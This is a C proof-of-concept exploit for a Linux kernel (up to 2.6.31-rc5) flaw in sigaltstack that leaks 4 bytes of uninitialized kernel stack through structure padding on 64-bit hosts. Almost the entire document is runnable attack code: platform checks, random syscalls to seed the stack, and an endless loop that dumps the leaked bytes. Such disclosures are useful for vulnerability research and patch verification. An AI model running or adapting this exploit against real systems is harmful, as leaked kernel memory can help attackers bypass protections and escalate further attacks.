======================================================================
Linux Kernel <= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure Exploit
======================================================================


/* 
 * sigaltstack-leak.c
 *
 * Linux Kernel <= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure
 * Jon Oberheide 
 * 
 * Information:
 * 
 *   http://git.kernel.org/linus/0083fc2c50e6c5127c2802ad323adf8143ab7856
 * 
 *   Ulrich Drepper correctly points out that there is generally padding in
 *   the structure on 64-bit hosts, and that copying the structure from
 *   kernel to user space can leak information from the kernel stack in those
 *   padding bytes.
 * 
 * Notes:
 * 
 *   Only 4 bytes of uninitialized kernel stack are leaked in the padding 
 *   between stack_t's ss_flags and ss_size.  The disclosure only affects 
 *   affects 64-bit hosts.
 */

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/types.h>

const int randcalls[] = {
	0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 13, 14, 16, 
	21, 22, 24, 25, 32, 33, 36, 37, 38, 39, 72, 73, 
	78, 79, 96, 97, 97, 102, 104, 105, 106, 107, 108, 
	109, 110, 11, 112, 113, 114, 116, 117, 118, 119, 
	120, 121, 121, 123, 124, 125, 140, 141, 143, 146
};

void
dump(const unsigned char *p, unsigned l)
{
	printf("stack_t:");
	while (l > 0) {
		printf(" ");
		if (l == 12) {
			printf("*** ");
		}
		printf("%02x", *p);
		if (l == 9) {
			printf(" ***");
		}
		++p; --l;
	}
	printf("\n");
}

int
main(void)
{
	char *p;
	int call, ret;
	size_t size, ftest, stest;
	stack_t oss;

	size = sizeof(stack_t);

	printf("[+] Checking platform...\n");

	if (size == 24) {
		printf("[+] sizeof(stack_t) = %zu\n", size);
		printf("[+] Correct size, 64-bit platform.\n");
	} else {
		printf("[-] sizeof(stack_t) = %zu\n", size);
		printf("[-] Error: you do not appear to be on a 64-bit platform.\n");
		printf("[-] No information disclosure is possible.\n");
		exit(1);
	}

	ftest = offsetof(stack_t, ss_flags) + sizeof(oss.ss_flags);
	stest = offsetof(stack_t, ss_size);

	printf("[+] Checking for stack_t hole...\n");

	if (ftest != stest) {
		printf("[+] ss_flags end (%zu) != ss_size start (%zu)\n", ftest, stest);
		printf("[+] Hole in stack_t present!\n", ftest, stest);
	} else {
		printf("[-] ss_flags end (%zu) == ss_size start (%zu)\n", ftest, stest);
		printf("[-] Error: No hole in stack_t, something is quite wrong.\n");
		exit(1);
	}

	printf("[+] Ready to call sigaltstack.\n\n");

	for (ret = 5; ret > 0; ret--) {
		printf("%d...\n", ret);
		sleep(1);
	}
	srand(time(NULL));

	while (1) {
		/* random stuff to make stack pseudo-interesting */
		call = rand() % (sizeof(randcalls) / sizeof(int));
		syscall(randcalls[call]);

		ret = sigaltstack(NULL, &oss);
		if (ret != 0) {
			printf("[-] Error: sigaltstack failed.\n");
			exit(1);
		}

		dump((unsigned char *) &oss, sizeof(oss));
	}

	return 0;
}

